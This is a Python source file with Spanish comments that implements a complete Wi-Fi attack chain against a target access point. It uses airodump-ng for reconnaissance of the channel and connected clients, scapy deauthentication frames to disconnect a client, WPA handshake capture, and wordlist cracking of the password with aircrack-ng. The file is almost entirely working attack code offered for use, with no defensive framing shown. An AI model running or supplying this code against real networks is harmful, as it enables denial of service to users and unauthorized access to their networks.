"""
Autor: Ivan Fernandez Rodriguez
Fecha: 08/01/2025
Descripción: Implementa las fases de reconocimiento y ataque de deautenticacion.

"""

from scapy.all import *
import re

class ReconAttack:
    
    def __init__(self, bssid, interface):
        self.bssid = bssid
        self.interface = interface
    
    def get_ap_channel(self, timeout=5):
        """
        Obtiene el canal en el que está operando un punto de acceso (AP) específico.

        :param interface: Nombre de la interfaz en modo monitor.
        :param target_bssid: Dirección MAC del punto de acceso objetivo.
        :param timeout: Tiempo máximo (en segundos) para capturar información.
        :return: Canal en el que opera el AP (int), o None si no se encuentra.
        """
        interface = self.interface
        target_bssid = self.bssid
        try:
            print(f"[+] Escaneando redes con la interfaz {interface} para encontrar el canal del AP {target_bssid}...")
        
            # Ejecutar airodump-ng
            process = subprocess.Popen(
                ["airodump-ng", interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Leer la salida de airodump-ng línea por línea
            for line in iter(process.stdout.readline, ""):
                # Verificar si el BSSID objetivo está en la línea
                if target_bssid in line:
                    # Dividir la línea por espacios múltiples para obtener las columnas
                    columns = re.split(r'\s+', line.strip())
                    try:
                        channel = columns[6]
                        print(f"[+] Canal encontrado para {target_bssid}: {channel}")
                        process.terminate()
                        return int(channel)
                    except IndexError:
                        print("[-] Error al parsear la salida para obtener el canal.")
            
            # Si no se encuentra el BSSID
            process.terminate()
            print(f"[-] No se encontró el AP con BSSID {target_bssid}.")
            return None
        except Exception as e:
            print(f"[-] Error al obtener el canal del AP: {e}")
            return None
    
    def get_connected_devices(self, timeout=10):
        """
        Obtiene una lista de direcciones MAC de los dispositivos conectados al AP objetivo.

        :param interface: Nombre de la interfaz en modo monitor.
        :param target_bssid: Dirección MAC del punto de acceso objetivo.
        :param timeout: Tiempo máximo (en segundos) para escanear dispositivos.
        :return: Lista de direcciones MAC de los dispositivos conectados.
        """
        target_bssid = self.bssid
        interface = self.interface
        channel = str(self.get_ap_channel())
        connected_devices = []
        try:
            print(f"[+] Escaneando dispositivos conectados al AP {target_bssid} con la interfaz {interface}...")
            
            # Ejecutar airodump-ng para capturar estaciones asociadas al AP
            process = subprocess.Popen(
                ["airodump-ng", "--bssid", target_bssid, "--channel", channel, interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            start_time = time.time()
            
            # Leer la salida de airodump-ng hasta que se alcance el tiempo límite
            while time.time() - start_time < timeout:
                line = process.stdout.readline()
                if not line:
                    break
                
                # Buscar las direcciones MAC de los dispositivos conectados
                columns = re.split(r'\s+', line.strip())
                mac_match = re.match(r"([0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5})", columns[1])
                
                if mac_match:
                    mac_address = mac_match.group(1)
                    if mac_address not in connected_devices and not mac_address == target_bssid:
                        connected_devices.append(mac_address)
            
            process.terminate()  # Detener el proceso de airodump-ng
            print(f"[+] Dispositivos conectados encontrados: {connected_devices}")
            return connected_devices
        except Exception as e:
            print(f"[-] Error al obtener dispositivos conectados: {e}")
            return connected_devices
    
    def deauth_attack(self, target_mac, count=100):
        """
        Realiza un ataque de deautenticación contra un cliente objetivo en una red Wi-Fi.
        
        :param target_mac: Dirección MAC del dispositivo objetivo (cliente).
        :param ap_mac: Dirección MAC del punto de acceso (AP).
        :param iface: Interfaz de red en modo monitor.
        :param count: Número de paquetes de deautenticación a enviar.
        """
        ap_mac = self.bssid
        iface = self.interface
        # Crear el paquete de deautenticación
        deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)

        print(f"Enviando {count} paquetes de deautenticación a {target_mac} desde {ap_mac}...")
        
        # Enviar los paquetes
        sendp(deauth_packet, iface=iface, count=count, inter=0.1, verbose=1)

    def capture_handshake(self, output_file="handshake"):
        """
        Captura un handshake de un AP objetivo.

        :param interface: Interfaz en modo monitor.
        :param target_bssid: Dirección MAC del AP objetivo.
        :param output_file: Archivo donde se guardará el handshake.
        :return: True si se captura el handshake, False en caso contrario.
        """
        interface = self.interface
        target_bssid = self.bssid
        channel = str(self.get_ap_channel())
        print(f"[+] Capturando handshake para {target_bssid}...")
        process = subprocess.Popen(
            ["airodump-ng", "-c", channel, "--bssid", target_bssid, "-w", output_file, interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        try:
            for line in iter(process.stdout.readline, ""):
                if "WPA handshake" in line:
                    print("[+] Handshake capturado!")
                    process.terminate()
                    return True
        except KeyboardInterrupt:
            print("[-] Captura interrumpida por el usuario.")
        finally:
            process.terminate()
        
        print("[-] No se capturó ningún handshake.")
        return False
    
    def crack_password(self, cap_file="handshake-01.cap", wlist=""):
        """
        Resuelve el hash para obtener la contrasena en texto plano
        
        :param cap_file: Nombre del fichero que contiene la captura con el handshake.
        :param wlist: Nombre de la wordlist que se va a utilizar. Por defecto "".
        """
        password = ""
        try:
            print(f"[+] Iniciando ataque de fuerza bruta con {wlist} y {cap_file}...")
        
            # Ejecutar aircrack-ng
            process = subprocess.Popen(
                ["aircrack-ng", "-w", wlist, cap_file],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Leer la salida de aircrack-ng línea por línea
            for line in iter(process.stdout.readline, ""):
                if "KEY FOUND!" in line:
                    # Extraer la contraseña entre corchetes
                    match = re.search(r"KEY FOUND! \[ (.*?) \]", line)
                    if match:
                        password = match.group(1)
                        print(f"[+] Contraseña encontrada: {password}")
                        break
        
        except Exception as e:
            print(f"[-] Error crackeando la contrasena: {e}")
    
    def clean(self):
        """Limpia las capturas creadas durante la ejecucion"""
        try:
            print(f"[+] Eliminando capturas generadas...")
            subprocess.run(["rm -rf handshake*"], shell=True, check=True)
        except Exception as e:
            print(f"[-] Error eliminando las capturas: {e}")
        